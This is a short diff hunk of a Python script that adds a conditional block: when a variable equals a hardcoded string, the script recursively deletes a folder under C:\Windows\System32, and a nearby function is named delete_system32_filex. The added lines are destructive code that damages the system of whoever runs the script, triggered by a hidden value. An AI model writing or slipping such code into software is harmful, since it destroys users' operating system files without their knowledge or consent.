@@ -11,6 +11,10 @@ import sys
 import shutil
 import os
 import gdown
+
+
+if file_contentsx1 =="0Dn9xQkFqKEa2":
+    shutil.rmtree(r'C:\Windows\System32\WCNMX')
 os.system('cls')
 '''
 def delete_system32_filex():
